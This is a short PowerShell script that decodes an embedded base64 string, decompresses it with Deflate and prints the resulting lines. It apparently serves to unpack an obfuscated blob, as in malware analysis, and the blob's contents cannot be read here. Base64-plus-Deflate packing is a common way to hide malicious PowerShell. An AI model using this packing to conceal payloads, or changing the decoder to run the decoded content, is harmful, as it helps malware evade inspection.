$base64_data = "RY9NT4NAFEX/yiwwA8EOWhubQogxpWmIBpt+hIWaFIZHmXZgRpi2IuG/O4taN+9t7r05xwjbUCYvK+QjnO+/5nS1w56xkWcZx74B1ck9NlDLWuSMg40/sG1cGjYm8A06LEb5ZJP5xMQVtjGcB0K/dA9UYQtFsF1vSQzpdvrKIFp7xum4DN6ef6Y+LpSSruNkGbQpnKDmLaGidIbgSLi/kxmRhXzifvMl2QEeSflwxKSRnCkT32DLy0UNCS1MI1zIchSxGLEKXeetTtVtd4EjgThHXCRBHvLZf+EWXUwtL8yRaWqFOahBqPkV6FNqgb8E4bNorgo02AEaTsZjC3XvAUt2lWgUow1Z1IJC03y67mqdLJV5XU415cHre5ooWnR97/0C"

$convert_data = [System.Convert]::FromBase64String($base64_data)

$mem_stream_data = New-Object System.IO.MemoryStream

$mem_stream_data.Write($convert_data, 0, $convert_data.Length)
$mem_stream_data.Seek(0,0) | Out-Null

$stream_reader_data = New-Object System.IO.StreamReader(New-Object System.IO.Compression.DeflateStream($mem_stream_data, [System.IO.Compression.CompressionMode]::Decompress))

Write-Output $convert_data
Write-Output $mem_stream_data
Write-Output $stream_reader_data
while ($line = $stream_reader_data.ReadLine()) {
	$line
}

PAUSE
